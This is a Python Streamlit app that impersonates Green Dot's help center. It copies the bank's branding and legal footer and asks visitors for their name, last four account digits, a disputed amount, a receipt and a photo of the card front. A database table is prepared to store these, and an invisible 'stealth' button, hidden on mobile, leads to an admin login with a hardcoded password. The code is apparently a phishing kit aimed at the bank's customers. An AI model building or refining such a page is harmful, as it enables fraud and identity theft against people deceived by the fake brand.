
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DB CONFIG ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- UI SHIELD ---
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    [data-testid='stHeader'], header, footer, .stDeployButton,
    .section-anchor, a.section-anchor,
    [data-testid='stHeaderActionElements'], .st-emotion-cache-gi0tri, .etxdrby3,
    [data-testid='stToolbar'], [data-testid='stElementToolbar'],
    .st-emotion-cache-140j12g, button[title='View fullscreen'] {
        display: none !important;
        visibility: hidden !important;
    }

    /* REFINED RESPONSIVE LOGO */
    [data-testid="stImage"] img {
        width: 280px !important;
        height: auto !important;
    }

    @media (max-width: 768px) {
        [data-testid="stImage"] img {
            width: 130px !important;
        }
    }

    .stButton > button {
        background-color: #00a05b !important;
        color: white !important;
        border-radius: 8px !important;
        font-weight: 600 !important;
        width: 100% !important;
        height: 45px !important;
    }

    .promo-box {
        background-color: #111; padding: 35px 20px; text-align: center;
        border-radius: 12px; margin: 25px 0; border: 1px solid #222;
        position: relative;
    }

    /* STEALTH TRIGGER */
    .stealth-trigger {
        position: absolute !important;
        bottom: 0 !important; left: 0 !important;
        width: 40px !important; height: 40px !important;
        z-index: 9999 !important;
    }

    .stealth-trigger button {
        background: transparent !important;
        border: none !important;
        color: transparent !important;
        box-shadow: none !important;
    }

    /* NUCLEAR HIDE ON MOBILE (MAX-WIDTH 768PX) */
    @media screen and (max-width: 768px) {
        .stealth-trigger, .stealth-trigger *, [key="stealth_admin_v84"] {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            pointer-events: none !important;
            height: 0 !important;
            width: 0 !important;
            max-height: 0 !important;
        }
    }

    .legal-container {
        font-size: 11px !important;
        color: #666 !important;
        text-align: center !important;
        margin-top: 40px !important;
        padding: 20px 10px !important;
        border-top: 1px solid #222 !important;
        line-height: 1.6 !important;
        background: transparent !important;
    }

    .legal-container * {
        background: transparent !important;
        color: #666 !important;
        border: none !important;
        pointer-events: none !important;
        display: inline !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 3, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_v32_8_4", clear_on_submit=True):
        st.text_input("Full Name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")

    st.markdown("""<div class='promo-box'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap;'>
            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
            </a>
            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
            </a>
        </div>
    """, unsafe_allow_html=True)

    st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
    if st.button(" ", key="stealth_admin_v84"):
        st.session_state.admin_mode = True
        st.rerun()
    st.markdown("</div></div>", unsafe_allow_html=True)

    st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)

else:
    st.title("Admin Access")
    pw = st.text_input("Auth Key", type="password")
    if st.button("CHECK"):
        if pw == "Diostieneelpoder1": st.write("Access Granted")
    if st.button("↩"):
        st.session_state.admin_mode = False
        st.rerun()
